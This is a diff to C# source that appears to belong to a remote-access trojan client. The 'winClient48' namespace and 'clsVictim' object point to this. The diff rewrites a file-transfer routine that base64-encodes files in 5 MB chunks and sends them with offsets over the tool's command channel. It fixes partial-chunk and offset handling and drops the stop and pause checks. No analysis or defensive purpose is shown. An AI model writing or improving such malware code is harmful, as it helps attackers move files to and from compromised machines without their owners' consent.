@@ -291,8 +291,7 @@ namespace winClient48
         }
         public void Download(string[] files, clsVictim v)
         {
-            int chunk_size = 1024 * 10;
-            byte[] file_buffer = new byte[chunk_size];
+            int chunk_size = 1024 * 1024 * 5;
 
             g_bDownloadPause = false;
             g_bDownloadFile = true;
@@ -313,38 +312,31 @@ namespace winClient48
                 FileInfo info = new FileInfo(file);
                 long file_len = info.Length;
 
-                int i = 0;
-                int bytes_read;
+                byte[] file_buffer = new byte[chunk_size];
+                long totalSent = 0;
+
                 using (FileStream fs = new FileStream(file, FileMode.Open, FileAccess.Read))
                 {
+                    int bytes_read;
                     while ((bytes_read = fs.Read(file_buffer, 0, file_buffer.Length)) > 0)
                     {
-                        if (!g_bDownloadFile)
-                        {
-                            v.SendCommand("file|df|stop");
-                            return;
-                        }
-                        while (g_bDownloadPause)
-                        {
-                            Thread.Sleep(1000);
-                        }
+                        string b64_data = Convert.ToBase64String(file_buffer, 0, bytes_read);
 
-                        string b64_data = Convert.ToBase64String(file_buffer);
-                        string szPayload = string.Join("|", new string[]
+                        string payload = string.Join("|", new string[]
                         {
                             "file",
                             "df",
                             "recv",
-                            clsCrypto.b64E2Str(tgt_filename), //TARGET FILE PATH
-                            file_len.ToString(), //FILE LENGTH
-                            (i * chunk_size).ToString(), //OFFSET
-                            b64_data, //BASE64 FILE DATA
+                            clsCrypto.b64E2Str(tgt_filename),
+                            file_len.ToString(),
+                            totalSent.ToString(),
+                            b64_data
                         });
 
-                        v.SendCommand(szPayload);
-                        i++;
+                        v.SendCommand(payload);
 
-                        Thread.Sleep(10);
+                        totalSent += bytes_read;
+                        Thread.Sleep(100);
                     }
                 }
             }
